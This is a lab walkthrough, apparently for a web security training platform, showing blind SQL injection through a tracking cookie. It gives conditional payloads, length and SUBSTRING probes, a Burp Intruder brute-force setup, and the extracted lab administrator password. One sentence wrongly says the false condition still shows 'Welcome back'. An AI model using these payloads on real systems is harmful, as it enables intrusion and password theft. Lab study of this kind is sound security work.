# Lab: Blind SQL injection with conditional responses
## Lab
This lab contains a __blind SQL injection__ vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a _"Welcome back"_ message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind __SQL injection__ vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Hint

You can assume that the password only contains lowercase, alphanumeric characters.

## Solution

When a request containing a TrackingId cookie is processed, the application determines whether this is a known user using an SQL query like this: 
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '7gTCiXoIdLi8ksjO'
```

Inject some conditions after TrackingId to check the boolean value of the query:
```SQL
' AND '1' = '1
' AND '1' = '2
```
When the query like this:
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '7gTCiXoIdLi8ksjO' AND '1' = '1'
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '7gTCiXoIdLi8ksjO' AND '1' = '2'
```

The application still returns result containing *Welcome back*, because the condition `'1' = '1` is TRUE. If we modify the condition to `'1' = '2` then the *Welcome back* message will be displayed because the query return false. application think that the cookie don't exist (this is new client) so that the application dont displayed *Welcome back* message.

Thanks for topic we know there is a table is `users` contain two columns are `username` and `password`. In `username` column have `administrator` user. 

Modify that addition condition to:
```SQL
' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) > 1) = 'a
```
When the query like this:
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '7gTCiXoIdLi8ksjO' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) > 1) = 'a'
```
Why we modified like that?
Because the result return for us just is boolean TRUE or FALSE of query select TrackingId, we use TRUE TrackingId for the application return TRUE combined with AND operator to join a conditional we want to check.
To find out password, fisrt we need check the length of password with condition `LENGTH(password) > 1` if that length greater than 1 the query is TRUE and application returns result containing _Welcome back_ message. Continue to increase the length to 2, 3, 4, ... until the _Welcome back_ message doesn't appear in returned result, that's the password length we look for!
Why we have to use this query:
```SQL
SELECT 'a' FROM users WHERE username = 'administrator' ... = 'a
```
Because the password we want to check is in table `users`, so that we use `FROM users` and `WHERE username... AND password...`.
And why `SELECT 'a'`? because at the end of query have a apostrophe (') to close the string, so that we need `SELECT 'a'` to query same `'a'='a'` (return TRUE).
All other conditions return TRUE, the only condition `LENGTH(password) > 1` to determine the value TRUE or FALSE of returned result.

After increase length to 20 (LENGTH(password) > 20) the _Welcome back_ message disappear. So we confirm that password length is 20.
Next step is brute force each value in each index of password. To do that we need use `SUBSTRING()` function:
```SQL
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator') = 'a
```
To put it simply `SUBSTRING(string,index,length)` function extract `string` from `index` with `length` is number of characters. Addition condition above take first character in password compare with character 'a', if the first character of password is 'a' the query will return TRUE and the _Welcome back_ message will display. But no one does it manually :v
Send this request into Intruder and modify payload:
```SQL
' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username = 'administrator') = '§a§
```
When the query like this:
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '7gTCiXoIdLi8ksjO' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username = 'administrator') = '§a§'
```

And select attack type is Cluster bomb.The first payload type is numbers from 1 to 20 and step is 1, the second payload type is simple list and we add characters a-z and 0-9, combimed with rep _Welcome back_ in tab Options.

> administrator - ff7rc95ysx1n8wg90gcn